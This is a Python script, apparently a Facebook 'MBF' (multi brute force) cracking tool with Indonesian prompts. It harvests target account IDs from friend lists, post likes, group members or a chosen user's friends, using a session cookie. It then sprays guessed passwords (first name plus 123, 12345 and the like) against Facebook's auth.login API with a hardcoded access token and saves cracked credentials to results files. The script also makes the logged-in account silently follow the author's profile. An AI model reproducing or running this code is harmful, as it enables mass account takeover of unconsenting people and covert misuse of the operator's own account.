#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#######################$
import os,sys,time,requests,bs4,json,re,random
from time import sleep
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r\033[1;97m[\033[1;96m•\033[1;97m]Waiting\033[90m...\033[1;97m{mins:02d}:{secs:02d}', end='', flush=True)
        time.sleep(1)
        total_second -= 1
        #countdownTimer(1, 00)
def clear():
    os.system("clear")
def exit():
    sys.exit("\033[1;97m[\033[1;91m!\033[1;97m]Bye...")
def sub():
    x=input('\033[1;97m[\033[1;92m+\033[1;97m]SUBSCRIBE channel admin? (\033[1;97my\033[1;97m/\033[1;92mt\033[1;97m):\033[1;92m ')
    if x == "y":
       os.system("xdg-open https://www.youtube.com/channel/UCbNNKkfDIwHYUQW-riv0ZYQ")
       balik()
    else:
       os.system("python fb.py")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./80)
def balik():
    f=input("\033[1;97m[\033[1;93m!\033[1;97m]Kembali?(y/t): ")
    if f == "y":
       os.system("python fb.py")
    else:
       exit()
def load():
    for x in range(1,101):
        time.sleep(1./20)
        print (f"\r\033[1;97m[\033[1;95m-\033[1;97m]Loading\033[90m...\033[1;97m(\033[1;92m{x}\033[90m%\033[1;97m)\r", end='', flush=True)
def baner():
    print ("""
\t\033[90m   ~  ~  ~   \033[1;92m┌∩┐(\033[1;91m◣_◢\033[1;92m)┌∩┐   \033[90m~  ~  ~
\t\t\033[1;97mFACEBOOK MBF COOKIES
\t\t\033[90m--------------------
\033[1;97m  {\033[1;91m•\033[1;97m}  Author    :  \033[1;96m Fahmi Apz\033[1;95m                        
\033[1;97m  {\033[1;91m•\033[1;97m}  Youtube   :   \033[1;96mKnifer12   \033[1;95m                       
\033[1;97m  {\033[1;91m•\033[1;97m}  Github    :\033[1;92m   https://github.com/BladeKnife\033[00m\033[1;95m     
\033[1;91m═══════════════════════════════════════════════════""")
def main():
    clear()
    kata("\033[1;97m[\033[1;91m!\033[1;97m]Waiting\033[90m...")
    sleep(2)
    clear()
    baner()
    print ("""
\033[1;95m\033[1;93m{\033[1;97m01\033[1;93m} \033[1;92mLOGIN                  
\033[1;95m\033[1;93m{\033[1;97m02\033[1;93m} \033[1;92mUPDATE \033[1;95m                
\033[1;95m\033[1;93m{\033[1;97m03\033[1;93m} \033[1;92mYT ADMIN \033[1;95m              
\033[1;95m\033[1;93m{\033[1;97m04\033[1;93m} \033[1;92mEXIT \033[1;95m                  
\033[1;91m═══════════════════════════════════════════════════""")
    tod=input("\033[1;97m[\033[1;96m?\033[1;97m]\033[90m > \033[1;92m ")
    if tod == "01" or tod == "1":
       import os
       import re
       import time
       import json
       import random
       import requests
       from bs4 import BeautifulSoup as parser
       from concurrent.futures import ThreadPoolExecutor
       mbasic = 'https://mbasic.facebook.com{}'
       global die,check,result, count
       id = []
       die = 0
       chek = []
       life = []
       count = 0
       check = 0
       result = 0
       def masuk():
           try:
                  cek = open("cookies").read()
           except FileNotFoundError:
                  cek = input("\033[1;37m[\033[1;92m+\033[1;97m]Cookies : \033[1;92m")
                  load()
                  print ('\n')
           cek = {"cookie":cek}
           ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
           if "mbasic_logout_button" in str(ismi):
                  if "Apa yang Anda pikirkan sekarang" in str(ismi):
                           with open("cookies","w") as f:
                                  f.write(cek["cookie"])
                  else:
                      print("\033[1;97m[\033[1;91m!\033[1;97m]Mengganti Bahasa")
                      kata("\033[1;97m[\033[1;91m!\033[1;97m] Tunggu sebentar..")
                      try:
                              requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                      except:
                              pass
                  try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/zettamus.zettamus.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                  except :
                         pass
                  return cek["cookie"]
           else:
                  print("\033[1;97m[\033[1;91m!\033[1;97m]Cookies Tidak Valid")
                  balik()
       def login(username,password,cek=False):
           global die,check,result,count
           b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
           params = {
                   'access_token': b,
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
           }
           api = 'https://b-api.facebook.com/method/auth.login'
           response = requests.get(api, params=params)
           if 'EAA' in response.text:
               print(f"\r\033[1;97m[\033[1;32m+\033[1;97m]\033[1;92m{username}\033[90m =>\033[1;92m {password}       \033[1;97m                 ",end="")
               print()
               result += 1
               if cek:
                      life.append(username+"|"+password)
               else:
                      with open('results-life.txt','a') as f:
                              f.write(username + '|' + password + '\n')
           elif 'www.facebook.com' in response.json()['error_msg']:
                 print(f"\r\033[1;97m[\033[1;91m!\033[0m] \033[1;93m{username}\033[90m => \033[1;93m{password}                            ",end="")
                 print()
                 check += 1
                 if cek:
                         chek.append(username+"|"+password)
                 else:
                         with open('results-check.txt','a') as f:
                              f.write(username + '|' + password + '\n')
           else:
                 die += 1
           for i in list('\|/-•'):
               print(f"\r\033[1;97m[\033[;91m{i}\033[1;97m] Life \033[90m=>\033[1;97m (\033[1;92m{str(result)}\033[1;97m)\033[1;97m|checkpoint\033[90m =>\033[1;97m (\033[1;93m{str(check)}\033[1;97m)\033[1;97m|die \033[90m=> \033[1;97m(\033[1;91m{str(die)}\033[1;97m)", end="")
               time.sleep(0.2)
       def getid(url):
           raw = requests.get(url,cookies=kuki).content
           getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
           for x in getuser:
               if 'profile' in x[0]:
                      id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
               elif 'friends' in x:
                      continue
               else:
                      id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
               print('\r\033[1;97m[\033[1;92m+\033[1;97m] ' + str(len(id)) + " Target",end="")
           if 'Lihat Teman Lain' in str(raw):
               getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
           return id
       def fromlikes(url):
           try:
                like = requests.get(url,cookies=kuki).content
                love = re.findall('href="(/ufi.*?)"',str(like))[0]
                aws = getlike(mbasic.format(love))
                return aws
           except:
                print("\033[1;97m[\033[1;91m!\033[1;97m]Gagal Mendapatkan id\n ")
                balik()
       def getlike(react):
           like = requests.get(react,cookies=kuki).content
           ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
           for user in ids:
               if 'profile' in user[0]:
                      id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
               else:
                      id.append(user[1] + "|" + user[0].split('/')[1])
               print(f'\r\033[1;97m[\033[1;92m+\033[1;97m] {str(len(id))} Target',end="")
           if 'Lihat Selengkapnya' in str(like):
               getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
           return id
       def bysearch(option):
           search = requests.get(option,cookies=kuki).content
           users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
           for user in users:
                if "profile" in user[0]:
                       id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                       id.append(user[1] + "|" + user[0].split("?")[0])
                print(f"\r\033[1;97m[\033[1;92m+\033[1;97m] {str(len(id))} Target ",end="")
           if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
           return id
       def grubid(endpoint):
           grab = requests.get(endpoint,cookies=kuki).content
           users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
           for user in users:
               if "profile" in user[0]:
                       id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
               else:
                       id.append(user[1] + "|" + user[0])
               print(f"\r\033[1;97m[\033[1;92m+\033[1;97m] {str(len(id))} Target ",end="")
           if "Lihat Selengkapnya" in str(grab):
               grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
           return id
       if __name__ == '__main__':
             try:
                 ses = requests.Session()
                 kukis = masuk()
                 kuki = {'cookie':kukis}
                 print('\033[1;93m{\033[1;37m1\033[1;93m}\033[1;92m Crack Daftar Teman')
                 print('\033[1;93m{\033[1;37m2\033[1;93m}\033[1;92m Crack Dari Like ')
                 print('\033[1;93m{\033[1;37m3\033[1;93m} \033[1;92mCrack Dari Grup ')
                 print('\033[1;93m{\033[1;37m4\033[1;93m} \033[1;92mCrack Dari Teman')
                 print('\033[1;93m{\033[1;37m5\033[1;93m} \033[1;92mLihat Hasil Crack')
                 print("\033[1;91m═══════════════════════════════════════════════════")
                 tanya = input('\033[1;97m[\033[1;96m?\033[1;97m]\033[90m > \033[1;92m')
                 if tanya =="":
                    print("\033[1;97m[\033[1;91m!\033[1;97m] Wrong Input!!")
                    balik()
                 elif tanya == '1':
                      url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                      load()
                      print ("\n")
                      username = getid(mbasic.format(url["href"]))
                 elif tanya == '2':
                      username = input("\033[1;97m[\033[1;92m+\033[1;97m]Url : \033[1;92m")
                      if username == "":
                         print("\033[1;97m[\033[1;91m!\033[1;97m] Wrong Input!!")
                         balik()
                      elif 'www.facebook' in username:
                            username = username.replace('www.facebook','mbasic.facebook')
                      elif 'm.facebook.com' in username:
                            username = username.replace('m.facebook.com','mbasic.facebook.com')
                      username = fromlikes(username)
                 elif tanya == '3':
                      grab = input("\033[1;97m[\033[1;92m+\033[1;97m]Masukan ID group : \033[1;92m")
                      username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                      if len(username) == 0:
                             print("\033[1;97m[\033[1;91m!\033[1;97m] ID Tidak ada")
                             balik()
                 elif tanya == '4':
                      knf = input("\033[1;97m[\033[1;92m+\033[1;97m]Masukan username/Id : \033[1;92m")
                      if knf.isdigit():
                         user = "/profile.php?id=" + knf
                      else:
                         user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 print("\033[1;97m[\033[1;91m!\033[1;97m]User Tidak Ditemukan ")
                                 balik()
                 elif tanya == '5':
                      try:
                              file1 = open("results-check.txt").read()
                              file2 = open("results-life.txt").read()
                              a = file1 + file2
                              final = a.strip().split("\n")
                              final = set(final)
                              print(f"\033[1;97m[\033[1;96m•\033[1;97m] {str(len(final))} account ")
                              with ThreadPoolExecutor(max_workers=10) as ex:
                                     for user in final:
                                         a = user.split("|")
                                         ex.submit(login,(a[0]),(a[1]),(True))
                              os.remove("results-check.txt")
                              os.remove("results-life.txt")
                              for x in life:
                                  with open('results-life.txt','a') as f:
                                       f.write(x+'\n')
                              for x in chek:
                                  with open('results-check.txt','a') as f:
                                       f.write(x+"\n")

                              print("\n\033[1;97m[\033[1;96m•\033[1;97m]Done")
                              print("\033[1;97m[\033[1;96m?\033[1;97m]Hasil Tersimpan Di File \033[90m=> \033[1;93m\n\tresults-check.txt\033[1;97m<>\033[1;92mresults-life.txt")
                              balik()
                      except FileNotFoundError:
                              print("\033[1;97m[\033[1;91m!\033[1;97m]Tidak Dapat Menemukan Hasil Crack")
                              balik()
                 else:
                       print("\033[1;97m[\033[1;91m!\033[1;97m] wrong input!!")
                       balik()
                 print()
                 expass = input("\033[1;97m[\033[1;32m+\033[0m]Password Tambahan: ")
                 with ThreadPoolExecutor(max_workers=30) as ex:
                       for user in username:
                           users = user.split('|')
                           ss = users[0].split(' ')
                           for x in ss:
                               listpass = [
                                          str(x) + '123',
                                          str(x) + '12345',
                                          str(x) + '123456',
                                          str(x) + '12',
                               ]
                               listpass.append(expass)
                               for passw in set(listpass):
                                   ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
                    print("\n\033[1;97m[\033[1;32m+\033[0m] Done. ")
                    print("\033[1;97m[\033[1;92m+\033[1;97m]file tersimpan di : ")
                    print("       \033[90m -\033[1;97m life : \033[1;92mresults-life.txt")
                    print("       \033[90m -\033[1;97m checkpoint : \033[1;93mresults-check.txt")
                    balik()
                 else:
                    print("\n\033[1;97m[\033[1;96m•\033[1;97m] Done")
                    print("\033[1;97m[\033[1;91m!\033[1;97m] No Result")
                    balik()
             except (KeyboardInterrupt,EOFError):
                      exit()
             except requests.exceptions.ConnectionError:
                      sys.exit("\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91mKoneksi Error\033[00m")
    elif tod == "02" or tod == "2":
         os.system("git pull")
         balik()
    elif tod == "03" or tod == "3":
         sub()
    elif tod == "00" or tod == "0":
         exit()
    else:
         os.system("python fb.py")
if __name__=="__main__":
     main()
